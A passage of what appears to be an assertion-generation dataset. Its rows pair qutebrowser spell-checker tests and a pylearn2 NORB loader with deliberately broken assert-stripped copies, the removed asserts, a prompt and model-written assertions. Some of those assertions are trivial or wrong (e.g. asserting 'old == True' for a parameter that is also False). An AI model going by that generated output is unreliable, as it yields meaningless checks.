    monkeypatch.setattr(standarddir, 'data', lambda: 'user_datapath')

    expected = os.path.join(subdir, 'qtwebengine_dictionaries')
    assert spell.dictionary_dir(old=old) == expected


def test_local_filename_dictionary_does_not_exist(monkeypatch):
    """"""Tests retrieving local filename when the dir doesn't exits.""""""
    monkeypatch.setattr(
        spell, 'dictionary_dir', lambda: '/some-non-existing-dir')
    assert not spell.local_filename('en-US')


def test_local_filename_dictionary_not_installed(tmpdir, monkeypatch):
    """"""Tests retrieving local filename when the dict not installed.""""""
    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
    assert not spell.local_filename('en-US')


def test_local_filename_not_installed_malformed(tmpdir, monkeypatch, caplog):
    """"""Tests retrieving local filename when the only file is malformed.""""""
    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
    (tmpdir / 'en-US.bdic').ensure()
    with caplog.at_level(logging.WARNING):
        assert not spell.local_filename('en-US')


def test_local_filename_dictionary_installed(tmpdir, monkeypatch):
    """"""Tests retrieving local filename when the dict installed.""""""
    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
    for lang_file in ['en-US-11-0.bdic', 'en-US-7-1.bdic', 'pl-PL-3-0.bdic']:
        (tmpdir / lang_file).ensure()
    assert spell.local_filename('en-US') == 'en-US-11-0.bdic'
    assert spell.local_filename('pl-PL') == 'pl-PL-3-0.bdic'


def test_local_filename_installed_malformed(tmpdir, monkeypatch, caplog):
    """"""Tests retrieving local filename when the dict installed.

    In this usecase, another existing file is malformed.""""""
    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
    for lang_file in ['en-US-11-0.bdic', 'en-US-7-1.bdic', 'en-US.bdic']:
        (tmpdir / lang_file).ensure()
    with caplog.at_level(logging.WARNING):
        assert spell.local_filename('en-US') == 'en-US-11-0.bdic'


class TestInit:

    ENV = 'QTWEBENGINE_DICTIONARIES_PATH'

    @pytest.fixture(autouse=True)
    def remove_envvar(self, monkeypatch):
        monkeypatch.delenv(self.ENV, raising=False)

    @pytest.fixture
    def patch_new_qt(self, monkeypatch):
        monkeypatch.setattr(spell.qtutils, 'version_check',
                            lambda _ver, compiled: True)

    @pytest.fixture
    def dict_dir(self, data_tmpdir):
        return data_tmpdir / 'qtwebengine_dictionaries'

    @pytest.fixture
    def old_dict_dir(self, monkeypatch, tmpdir):
        data_dir = tmpdir / 'old'
        dict_dir = data_dir / 'qtwebengine_dictionaries'
        (dict_dir / 'somedict').ensure()
        monkeypatch.setattr(spell.QLibraryInfo, 'location',
                            lambda _arg: str(data_dir))
        return dict_dir

    def test_old_qt(self, monkeypatch):
        monkeypatch.setattr(spell.qtutils, 'version_check',
                            lambda _ver, compiled: False)
        spell.init()
        assert self.ENV not in os.environ

    def test_new_qt(self, dict_dir, patch_new_qt):
        spell.init()
        assert os.environ[self.ENV] == str(dict_dir)

    def test_moving(self, old_dict_dir, dict_dir, patch_new_qt):
        spell.init()
        assert (dict_dir / 'somedict').exists()

    def test_moving_oserror(self, mocker, caplog,
                            old_dict_dir, dict_dir, patch_new_qt):
        mocker.patch('shutil.copytree', side_effect=OSError)

        with caplog.at_level(logging.ERROR):
            spell.init()

        assert caplog.messages[0] == 'Failed to copy old dictionaries'

    def test_moving_existing_destdir(self, old_dict_dir, dict_dir,
                                     patch_new_qt):
        dict_dir.ensure(dir=True)
        spell.init()
        assert not (dict_dir / 'somedict').exists()
","
1# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:
2
3# Copyright 2017-2020 Florian Bruhin (The Compiler) <mail@qutebrowser.org>
4# Copyright 2017-2018 Michal Siedlaczek <michal.siedlaczek@gmail.com>
5
6# This file is part of qutebrowser.
7#
8# qutebrowser is free software: you can redistribute it and/or modify
9# it under the terms of the GNU General Public License as published by
10# the Free Software Foundation, either version 3 of the License, or
11# (at your option) any later version.
12#
13# qutebrowser is distributed in the hope that it will be useful,
14# but WITHOUT ANY WARRANTY; without even the implied warranty of
15# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
16# GNU General Public License for more details.
17#
18# You should have received a copy of the GNU General Public License
19# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.
20
21import logging
22import os
23
24import pytest
25from PyQt5.QtCore import QLibraryInfo
26
27from qutebrowser.browser.webengine import spell
28from qutebrowser.utils import usertypes, qtutils, standarddir
29
30
31def test_version(message_mock, caplog):
32    """"""Tests parsing dictionary version from its file name.""""""
33    with caplog.at_level(logging.WARNING):
34    msg = message_mock.getmsg(usertypes.MessageLevel.warning)
35    expected = (""Found a dictionary with a malformed name: malformed_filename"")
36
37
38@pytest.mark.parametrize('qt_version, old, subdir', [
39    ('5.9', True, 'global_datapath'),
40    ('5.9', False, 'global_datapath'),
41    ('5.10', True, 'global_datapath'),
42    ('5.10', False, 'user_datapath'),
43])
44def test_dictionary_dir(monkeypatch, qt_version, old, subdir):
45    monkeypatch.setattr(qtutils, 'qVersion', lambda: qt_version)
46    monkeypatch.setattr(QLibraryInfo, 'location', lambda _: 'global_datapath')
47    monkeypatch.setattr(standarddir, 'data', lambda: 'user_datapath')
48
49    expected = os.path.join(subdir, 'qtwebengine_dictionaries')
50
51
52def test_local_filename_dictionary_does_not_exist(monkeypatch):
53    """"""Tests retrieving local filename when the dir doesn't exits.""""""
54    monkeypatch.setattr(
55        spell, 'dictionary_dir', lambda: '/some-non-existing-dir')
56
57
58def test_local_filename_dictionary_not_installed(tmpdir, monkeypatch):
59    """"""Tests retrieving local filename when the dict not installed.""""""
60    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
61
62
63def test_local_filename_not_installed_malformed(tmpdir, monkeypatch, caplog):
64    """"""Tests retrieving local filename when the only file is malformed.""""""
65    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
66    (tmpdir / 'en-US.bdic').ensure()
67    with caplog.at_level(logging.WARNING):
68
69
70def test_local_filename_dictionary_installed(tmpdir, monkeypatch):
71    """"""Tests retrieving local filename when the dict installed.""""""
72    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
73    for lang_file in ['en-US-11-0.bdic', 'en-US-7-1.bdic', 'pl-PL-3-0.bdic']:
74        (tmpdir / lang_file).ensure()
75
76
77def test_local_filename_installed_malformed(tmpdir, monkeypatch, caplog):
78    """"""Tests retrieving local filename when the dict installed.
79
80    In this usecase, another existing file is malformed.""""""
81    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
82    for lang_file in ['en-US-11-0.bdic', 'en-US-7-1.bdic', 'en-US.bdic']:
83        (tmpdir / lang_file).ensure()
84    with caplog.at_level(logging.WARNING):
85
86
87class TestInit:
88
89    ENV = 'QTWEBENGINE_DICTIONARIES_PATH'
90
91    @pytest.fixture(autouse=True)
92    def remove_envvar(self, monkeypatch):
93        monkeypatch.delenv(self.ENV, raising=False)
94
95    @pytest.fixture
96    def patch_new_qt(self, monkeypatch):
97        monkeypatch.setattr(spell.qtutils, 'version_check',
98                            lambda _ver, compiled: True)
99
100    @pytest.fixture
101    def dict_dir(self, data_tmpdir):
102        return data_tmpdir / 'qtwebengine_dictionaries'
103
104    @pytest.fixture
105    def old_dict_dir(self, monkeypatch, tmpdir):
106        data_dir = tmpdir / 'old'
107        dict_dir = data_dir / 'qtwebengine_dictionaries'
108        (dict_dir / 'somedict').ensure()
109        monkeypatch.setattr(spell.QLibraryInfo, 'location',
110                            lambda _arg: str(data_dir))
111        return dict_dir
112
113    def test_old_qt(self, monkeypatch):
114        monkeypatch.setattr(spell.qtutils, 'version_check',
115                            lambda _ver, compiled: False)
116        spell.init()
117
118    def test_new_qt(self, dict_dir, patch_new_qt):
119        spell.init()
120
121    def test_moving(self, old_dict_dir, dict_dir, patch_new_qt):
122        spell.init()
123
124    def test_moving_oserror(self, mocker, caplog,
125                            old_dict_dir, dict_dir, patch_new_qt):
126        mocker.patch('shutil.copytree', side_effect=OSError)
127
128        with caplog.at_level(logging.ERROR):
129            spell.init()
130
131
132    def test_moving_existing_destdir(self, old_dict_dir, dict_dir,
133                                     patch_new_qt):
134        dict_dir.ensure(dir=True)
135        spell.init()
136","[[""spell.version('en-US-8-0.bdic')"", '==', '(8'], [""spell.version('pl-PL-3-0.bdic')"", '==', '(3'], [""spell.version('malformed_filename')"", '==', 'None'], ['msg.text', '==', 'expected'], ['spell.dictionary_dir(old=old)', '==', 'expected'], [""spell.local_filename('en-US')"", '==', 'False'], [""spell.local_filename('en-US')"", '==', 'False'], [""spell.local_filename('en-US')"", '==', 'False'], [""spell.local_filename('en-US')"", '==', ""'en-US-11-0.bdic'""], [""spell.local_filename('pl-PL')"", '==', ""'pl-PL-3-0.bdic'""], [""spell.local_filename('en-US')"", '==', ""'en-US-11-0.bdic'""], ['os.environ[self.ENV]', '==', 'str(dict_dir)'], ['(dict_dir', '/', ""'somedict').exists()""], ['caplog.messages[0]', '==', ""'Failed to copy old dictionaries'""], ['(dict_dir', '/', ""'somedict').exists()""]]",16,15,0.9375,0.0025720164609053,"['message_mock', 'caplog', 'msg', 'expected', 'monkeypatch', 'qt_version', 'old', 'subdir', 'tmpdir', 'ENV', 'data_tmpdir', 'data_dir', 'dict_dir', 'patch_new_qt', 'old_dict_dir', 'mocker']",16,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['message_mock', 'caplog', 'msg', 'expected', 'monkeypatch', 'qt_version', 'old', 'subdir', 'tmpdir', 'ENV', 'data_tmpdir', 'data_dir', 'dict_dir', 'patch_new_qt', 'old_dict_dir', 'mocker']
*Code:

1# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:
2
3# Copyright 2017-2020 Florian Bruhin (The Compiler) <mail@qutebrowser.org>
4# Copyright 2017-2018 Michal Siedlaczek <michal.siedlaczek@gmail.com>
5
6# This file is part of qutebrowser.
7#
8# qutebrowser is free software: you can redistribute it and/or modify
9# it under the terms of the GNU General Public License as published by
10# the Free Software Foundation, either version 3 of the License, or
11# (at your option) any later version.
12#
13# qutebrowser is distributed in the hope that it will be useful,
14# but WITHOUT ANY WARRANTY; without even the implied warranty of
15# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
16# GNU General Public License for more details.
17#
18# You should have received a copy of the GNU General Public License
19# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.
20
21import logging
22import os
23
24import pytest
25from PyQt5.QtCore import QLibraryInfo
26
27from qutebrowser.browser.webengine import spell
28from qutebrowser.utils import usertypes, qtutils, standarddir
29
30
31def test_version(message_mock, caplog):
32    """"""Tests parsing dictionary version from its file name.""""""
33    with caplog.at_level(logging.WARNING):
34    msg = message_mock.getmsg(usertypes.MessageLevel.warning)
35    expected = (""Found a dictionary with a malformed name: malformed_filename"")
36
37
38@pytest.mark.parametrize('qt_version, old, subdir', [
39    ('5.9', True, 'global_datapath'),
40    ('5.9', False, 'global_datapath'),
41    ('5.10', True, 'global_datapath'),
42    ('5.10', False, 'user_datapath'),
43])
44def test_dictionary_dir(monkeypatch, qt_version, old, subdir):
45    monkeypatch.setattr(qtutils, 'qVersion', lambda: qt_version)
46    monkeypatch.setattr(QLibraryInfo, 'location', lambda _: 'global_datapath')
47    monkeypatch.setattr(standarddir, 'data', lambda: 'user_datapath')
48
49    expected = os.path.join(subdir, 'qtwebengine_dictionaries')
50
51
52def test_local_filename_dictionary_does_not_exist(monkeypatch):
53    """"""Tests retrieving local filename when the dir doesn't exits.""""""
54    monkeypatch.setattr(
55        spell, 'dictionary_dir', lambda: '/some-non-existing-dir')
56
57
58def test_local_filename_dictionary_not_installed(tmpdir, monkeypatch):
59    """"""Tests retrieving local filename when the dict not installed.""""""
60    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
61
62
63def test_local_filename_not_installed_malformed(tmpdir, monkeypatch, caplog):
64    """"""Tests retrieving local filename when the only file is malformed.""""""
65    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
66    (tmpdir / 'en-US.bdic').ensure()
67    with caplog.at_level(logging.WARNING):
68
69
70def test_local_filename_dictionary_installed(tmpdir, monkeypatch):
71    """"""Tests retrieving local filename when the dict installed.""""""
72    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
73    for lang_file in ['en-US-11-0.bdic', 'en-US-7-1.bdic', 'pl-PL-3-0.bdic']:
74        (tmpdir / lang_file).ensure()
75
76
77def test_local_filename_installed_malformed(tmpdir, monkeypatch, caplog):
78    """"""Tests retrieving local filename when the dict installed.
79
80    In this usecase, another existing file is malformed.""""""
81    monkeypatch.setattr(spell, 'dictionary_dir', lambda: str(tmpdir))
82    for lang_file in ['en-US-11-0.bdic', 'en-US-7-1.bdic', 'en-US.bdic']:
83        (tmpdir / lang_file).ensure()
84    with caplog.at_level(logging.WARNING):
85
86
87class TestInit:
88
89    ENV = 'QTWEBENGINE_DICTIONARIES_PATH'
90
91    @pytest.fixture(autouse=True)
92    def remove_envvar(self, monkeypatch):
93        monkeypatch.delenv(self.ENV, raising=False)
94
95    @pytest.fixture
96    def patch_new_qt(self, monkeypatch):
97        monkeypatch.setattr(spell.qtutils, 'version_check',
98                            lambda _ver, compiled: True)
99
100    @pytest.fixture
101    def dict_dir(self, data_tmpdir):
102        return data_tmpdir / 'qtwebengine_dictionaries'
103
104    @pytest.fixture
105    def old_dict_dir(self, monkeypatch, tmpdir):
106        data_dir = tmpdir / 'old'
107        dict_dir = data_dir / 'qtwebengine_dictionaries'
108        (dict_dir / 'somedict').ensure()
109        monkeypatch.setattr(spell.QLibraryInfo, 'location',
110                            lambda _arg: str(data_dir))
111        return dict_dir
112
113    def test_old_qt(self, monkeypatch):
114        monkeypatch.setattr(spell.qtutils, 'version_check',
115                            lambda _ver, compiled: False)
116        spell.init()
117
118    def test_new_qt(self, dict_dir, patch_new_qt):
119        spell.init()
120
121    def test_moving(self, old_dict_dir, dict_dir, patch_new_qt):
122        spell.init()
123
124    def test_moving_oserror(self, mocker, caplog,
125                            old_dict_dir, dict_dir, patch_new_qt):
126        mocker.patch('shutil.copytree', side_effect=OSError)
127
128        with caplog.at_level(logging.ERROR):
129            spell.init()
130
131
132    def test_moving_existing_destdir(self, old_dict_dir, dict_dir,
133                                     patch_new_qt):
134        dict_dir.ensure(dir=True)
135        spell.init()
136",6858,"[[32, 'msg', '!=', '', 'msg should be a non empty string'],
 [32, 'expected', '!=', '', 'expected should be a non empty string'],
 [34, 'msg', '!=', '', 'msg should be a non empty string'],
 [35, 'expected', '!=', '', 'expected should be a non empty string'],
 [44, 'qt_version', '!=', '', 'qt version should be a non empty string'],
 [44, 'old', '==', True, 'Ensure old variable is set to True'],
 [44, 'subdir', '!=', '', 'subdir should be a non empty string'],
 [52, 'monkeypatch', '!=', None, 'monkeypatch object should not be None'],
 [58, 'tmpdir', '!=', None, 'tmpdir object should not be None'],
 [58, 'monkeypatch', '!=', None, 'monkeypatch object should not be None'],
 [63, 'tmpdir', '!=', None, 'tmpdir object should not be None'],
 [63, 'monkeypatch', '!=', None, 'monkeypatch object should not be None'],
 [63, 'caplog', '!=', None, 'caplog object should not be None'],
 [70, 'tmpdir', '!=', None, 'tmpdir object should not be None'],
 [70, 'monkeypatch', '!=', None, 'monkeypatch object should not be None'],
 [77, 'tmpdir', '!=', None, 'tmpdir object should not be None'],
 [77, 'monkeypatch', '!=', None, 'monkeypatch object should not be None'],
 [77, 'caplog', '!=', None, 'caplog object should not be None'],
 [89, 'ENV', '!=', '', 'ENV string should not be empty'],
 [96, 'monkeypatch', '!=', None, 'monkeypatch object should not be None'],
 [104, 'data_tmpdir', '!=', None, 'data_tmpdir object should not be None'],
 [111, 'monkeypatch', '!=', None, 'monkeypatch object should not be None'],
 [111, 'tmpdir', '!=', None, 'tmpdir object should not be None'],
 [113, 'monkeypatch', '!=', None, 'monkeypatch object should not be None'],
 [118, 'dict_dir', '!=', None, 'dict_dir object should not be None'],
 [118, 'patch_new_qt', '!=', None, 'patch_new_qt object should not be None'],
 [121, 'old_dict_dir', '!=', None, 'old_dict_dir object should not be None'],
 [121, 'dict_dir', '!=', None, 'dict_dir object should not be None'],
 [121, 'patch_new_qt', '!=', None, 'patch_new_qt object should not be None'],
 [124, 'mocker', '!=', None, 'mocker object should not be None'],
 [124, 'caplog', '!=', None, 'caplog object should not be None'],
 [124, 'old_dict_dir', '!=', None, 'old_dict_dir object should not be None'],
 [124, 'dict_dir', '!=', None, 'dict_dir object should not be None'],
 [124, 'patch_new_qt', '!=', None, 'patch_new_qt object should not be None'],
 [132, 'old_dict_dir', '!=', None, 'old_dict_dir object should not be None'],
 [132, 'dict_dir', '!=', None, 'dict_dir object should not be None'],
 [132, 'patch_new_qt', '!=', None, 'patch_new_qt object should not be None']]"
JesseLivezey/plankton,"""""""
.. todo::

    WRITEME
""""""
import numpy
np = numpy
import os

from theano.compat.six.moves import reduce

from pylearn2.datasets import dense_design_matrix
from pylearn2.datasets import retina
from pylearn2.datasets.cache import datasetCache


class NORBSmall(dense_design_matrix.DenseDesignMatrix):

    """"""
    A pylearn2 dataset object for the small NORB dataset (v1.0).

    Parameters
    ----------
    which_set : WRITEME
        one of ['train','test']
    center : WRITEME
        data is in range [0,256], center=True subtracts 127.5.
    multi_target : WRITEME
        load extra information as additional labels.
    """"""

    @classmethod
    def load(cls, which_set, desc):
        """"""
        .. todo::

            WRITEME
        """"""
        assert desc in ['dat', 'cat', 'info']

        base = '%s/norb_small/original_npy/smallnorb-'
        base = base % os.getenv('PYLEARN2_DATA_PATH')
        if which_set == 'train':
            base += '5x46789x9x18x6x2x96x96-training'
        else:
            base += '5x01235x9x18x6x2x96x96-testing'

        fname = base + '-%s.npy' % desc
        fname = datasetCache.cache_file(fname)
        fp = open(fname, 'r')
        data = np.load(fp)
        fp.close()

        return data

    def __init__(self, which_set, center=False, multi_target=False):
        assert which_set in ['train', 'test']

        X = NORBSmall.load(which_set, 'dat')

        # put things in pylearn2's DenseDesignMatrix format
        X = np.cast['float32'](X)
        X = X.reshape(-1, 2 * 96 * 96)

        # this is uint8
        y = NORBSmall.load(which_set, 'cat')
        if multi_target:
            y_extra = NORBSmall.load(which_set, 'info')
            y = np.hstack((y[:, np.newaxis], y_extra))

        if center:
            X -= 127.5

        view_converter = dense_design_matrix.DefaultViewConverter((96, 96, 2))

        super(NORBSmall, self).__init__(X=X, y=y, y_labels=np.max(y) + 1,
                                        view_converter=view_converter)


class FoveatedNORB(dense_design_matrix.DenseDesignMatrix):

    """"""
    .. todo::

        WRITEME

    Parameters
    ----------
    which_set : WRITEME
        One of ['train','test']
    center : WRITEME
        Data is in range [0,256], center=True subtracts 127.5.
        # TODO: check this comment, sure it means {0, ..., 255}
    scale : WRITEME
    start : WRITEME
    stop : WRITEME
    restrict_instances : WRITEME
    preprocessor : WRITEME
    """"""

    @classmethod
    def load(cls, which_set):

        base = '%s/norb_small/foveated/smallnorb-'
        base = base % os.getenv('PYLEARN2_DATA_PATH')
        if which_set == 'train':
            base += '5x46789x9x18x6x2x96x96-training-dat'
        else:
            base += '5x01235x9x18x6x2x96x96-testing-dat'

        fname = base + '.npy'
        fname = datasetCache.cache_file(fname)
        data = np.load(fname, 'r')
        return data

    def __init__(self, which_set, center=False, scale=False,
                 start=None, stop=None, restrict_instances=None,
                 preprocessor=None):

        self.args = locals()

        if which_set not in ['train', 'test']:
            raise ValueError(""Unrecognized which_set value: "" + which_set)

        X = FoveatedNORB.load(which_set)
        X = np.cast['float32'](X)

        # this is uint8
        y = NORBSmall.load(which_set, 'cat')
        y_extra = NORBSmall.load(which_set, 'info')

        assert y_extra.shape[0] == y.shape[0]
        instance = y_extra[:, 0]
        assert instance.min() >= 0
        assert instance.max() <= 9
        self.instance = instance

        if center:
            X -= 127.5
            if scale:
                X /= 127.5
        else:
            if scale:
                X /= 255.

        view_converter = retina.RetinaCodingViewConverter((96, 96, 2),
                                                          (8, 4, 2, 2))

        super(FoveatedNORB, self).__init__(X=X, y=y,
                                           y_labels=np.max(y) + 1,
                                           view_converter=view_converter,
                                           preprocessor=preprocessor)

        if restrict_instances is not None:
            assert start is None
            assert stop is None
            self.restrict_instances(restrict_instances)

        self.restrict(start, stop)

        self.y = self.y.astype('float32')

    def get_test_set(self):
        """"""
        .. todo::

            WRITEME
        """"""
        test_args = {'which_set': 'test'}

        for key in self.args:
            if key in ['which_set', 'restrict_instances',
                       'self', 'start', 'stop']:
                continue
            test_args[key] = self.args[key]

        return FoveatedNORB(**test_args)

    def restrict_instances(self, instances):
        """"""
        .. todo::

            WRITEME
        """"""
        mask = reduce(np.maximum, [self.instance == ins for ins in instances])
        mask = mask.astype('bool')
        self.instance = self.instance[mask]
        self.X = self.X[mask, :]
        if self.y.ndim == 2:
            self.y = self.y[mask, :]
        else:
            self.y = self.y[mask]
        assert self.X.shape[0] == self.y.shape[0]
        expected = sum([(self.instance == ins).sum() for ins in instances])
        assert self.X.shape[0] == expected
","
1""""""
2.. todo::
3
4    WRITEME
5""""""
6import numpy
7np = numpy
8import os
9
10from theano.compat.six.moves import reduce
11
12from pylearn2.datasets import dense_design_matrix
13from pylearn2.datasets import retina
14from pylearn2.datasets.cache import datasetCache
15
16
17class NORBSmall(dense_design_matrix.DenseDesignMatrix):
18
19    """"""
20    A pylearn2 dataset object for the small NORB dataset (v1.0).
21
22    Parameters
23    ----------
24    which_set : WRITEME
25        one of ['train','test']
26    center : WRITEME
27        data is in range [0,256], center=True subtracts 127.5.
28    multi_target : WRITEME
29        load extra information as additional labels.
30    """"""
31
32    @classmethod
33    def load(cls, which_set, desc):
34        """"""
35        .. todo::
36
37            WRITEME
38        """"""
39
40        base = '%s/norb_small/original_npy/smallnorb-'
41        base = base % os.getenv('PYLEARN2_DATA_PATH')
42        if which_set == 'train':
43            base += '5x46789x9x18x6x2x96x96-training'
44        else:
45            base += '5x01235x9x18x6x2x96x96-testing'
46
47        fname = base + '-%s.npy' % desc
48        fname = datasetCache.cache_file(fname)
49        fp = open(fname, 'r')
50        data = np.load(fp)
51        fp.close()
52
53        return data
54
55    def __init__(self, which_set, center=False, multi_target=False):
56
57        X = NORBSmall.load(which_set, 'dat')
58
59        # put things in pylearn2's DenseDesignMatrix format
60        X = np.cast['float32'](X)
61        X = X.reshape(-1, 2 * 96 * 96)
62
63        # this is uint8
64        y = NORBSmall.load(which_set, 'cat')
65        if multi_target:
66            y_extra = NORBSmall.load(which_set, 'info')
67            y = np.hstack((y[:, np.newaxis], y_extra))
68
69        if center:
70            X -= 127.5
71
72        view_converter = dense_design_matrix.DefaultViewConverter((96, 96, 2))
73
74        super(NORBSmall, self).__init__(X=X, y=y, y_labels=np.max(y) + 1,
75                                        view_converter=view_converter)
76
77
78class FoveatedNORB(dense_design_matrix.DenseDesignMatrix):
79
80    """"""
81    .. todo::
82
83        WRITEME
84
85    Parameters
86    ----------
87    which_set : WRITEME
88        One of ['train','test']
89    center : WRITEME
90        Data is in range [0,256], center=True subtracts 127.5.
91        # TODO: check this comment, sure it means {0, ..., 255}
92    scale : WRITEME
93    start : WRITEME
94    stop : WRITEME
95    restrict_instances : WRITEME
96    preprocessor : WRITEME
97    """"""
98
99    @classmethod
100    def load(cls, which_set):
101
102        base = '%s/norb_small/foveated/smallnorb-'
103        base = base % os.getenv('PYLEARN2_DATA_PATH')
104        if which_set == 'train':
105            base += '5x46789x9x18x6x2x96x96-training-dat'
106        else:
107            base += '5x01235x9x18x6x2x96x96-testing-dat'
108
109        fname = base + '.npy'
110        fname = datasetCache.cache_file(fname)
111        data = np.load(fname, 'r')
112        return data
113
114    def __init__(self, which_set, center=False, scale=False,
115                 start=None, stop=None, restrict_instances=None,
116                 preprocessor=None):
117
118        self.args = locals()
119
120        if which_set not in ['train', 'test']:
121            raise ValueError(""Unrecognized which_set value: "" + which_set)
122
123        X = FoveatedNORB.load(which_set)
124        X = np.cast['float32'](X)
125
126        # this is uint8
127        y = NORBSmall.load(which_set, 'cat')
128        y_extra = NORBSmall.load(which_set, 'info')
129
130        instance = y_extra[:, 0]
131        self.instance = instance
132
133        if center:
134            X -= 127.5
135            if scale:
136                X /= 127.5
137        else:
138            if scale:
139                X /= 255.
140
141        view_converter = retina.RetinaCodingViewConverter((96, 96, 2),
142                                                          (8, 4, 2, 2))
143
144        super(FoveatedNORB, self).__init__(X=X, y=y,
145                                           y_labels=np.max(y) + 1,
146                                           view_converter=view_converter,
147                                           preprocessor=preprocessor)
148
149        if restrict_instances is not None:
150            self.restrict_instances(restrict_instances)
151
152        self.restrict(start, stop)
153
154        self.y = self.y.astype('float32')
155
156    def get_test_set(self):
157        """"""
158        .. todo::
159
160            WRITEME
161        """"""
162        test_args = {'which_set': 'test'}
163
164        for key in self.args:
165            if key in ['which_set', 'restrict_instances',
166                       'self', 'start', 'stop']:
167                continue
168            test_args[key] = self.args[key]
169
170        return FoveatedNORB(**test_args)
171
172    def restrict_instances(self, instances):
173        """"""
174        .. todo::
175
176            WRITEME
177        """"""
178        mask = reduce(np.maximum, [self.instance == ins for ins in instances])
179        mask = mask.astype('bool')
180        self.instance = self.instance[mask]
181        self.X = self.X[mask, :]
182        if self.y.ndim == 2:
183            self.y = self.y[mask, :]
184        else:
185            self.y = self.y[mask]
186        expected = sum([(self.instance == ins).sum() for ins in instances])
187","[['y_extra.shape[0]', '==', 'y.shape[0]'], ['instance.min()', '>=', '0'], ['instance.max()', '<=', '9'], ['start', '==', 'None'], ['stop', '==', 'None'], ['self.X.shape[0]', '==', 'self.y.shape[0]'], ['self.X.shape[0]', '==', 'expected']]",9,7,0.7777777777777778,0.0012955765315565,"['np', 'cls', 'which_set', 'desc', 'base', 'fname', 'fp', 'data', 'center', 'multi_target', 'X', 'y', 'y_extra', 'view_converter', 'scale', 'self.args', 'instance', 'self.instance', 'self.y', 'test_args', 'test_args[key]', 'instances', 'mask', 'self.X', 'expected']",25,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['np', 'cls', 'which_set', 'desc', 'base', 'fname', 'fp', 'data', 'center', 'multi_target', 'X', 'y', 'y_extra', 'view_converter', 'scale', 'self.args', 'instance', 'self.instance', 'self.y', 'test_args', 'test_args[key]', 'instances', 'mask', 'self.X', 'expected']
*Code:

1""""""
2.. todo::
3
4    WRITEME
5""""""
6import numpy
7np = numpy
8import os
9
10from theano.compat.six.moves import reduce
11
12from pylearn2.datasets import dense_design_matrix
13from pylearn2.datasets import retina
14from pylearn2.datasets.cache import datasetCache
15
16
17class NORBSmall(dense_design_matrix.DenseDesignMatrix):
18
19    """"""
20    A pylearn2 dataset object for the small NORB dataset (v1.0).
21
22    Parameters
23    ----------
24    which_set : WRITEME
25        one of ['train','test']
26    center : WRITEME
27        data is in range [0,256], center=True subtracts 127.5.
28    multi_target : WRITEME
29        load extra information as additional labels.
30    """"""
31
32    @classmethod
33    def load(cls, which_set, desc):
34        """"""
35        .. todo::
36
37            WRITEME
38        """"""
39
40        base = '%s/norb_small/original_npy/smallnorb-'
41        base = base % os.getenv('PYLEARN2_DATA_PATH')
42        if which_set == 'train':
43            base += '5x46789x9x18x6x2x96x96-training'
44        else:
45            base += '5x01235x9x18x6x2x96x96-testing'
46
47        fname = base + '-%s.npy' % desc
48        fname = datasetCache.cache_file(fname)
49        fp = open(fname, 'r')
50        data = np.load(fp)
51        fp.close()
52
53        return data
54
55    def __init__(self, which_set, center=False, multi_target=False):
56
57        X = NORBSmall.load(which_set, 'dat')
58
59        # put things in pylearn2's DenseDesignMatrix format
60        X = np.cast['float32'](X)
61        X = X.reshape(-1, 2 * 96 * 96)
62
63        # this is uint8
64        y = NORBSmall.load(which_set, 'cat')
65        if multi_target:
66            y_extra = NORBSmall.load(which_set, 'info')
67            y = np.hstack((y[:, np.newaxis], y_extra))
68
69        if center:
70            X -= 127.5
71
72        view_converter = dense_design_matrix.DefaultViewConverter((96, 96, 2))
73
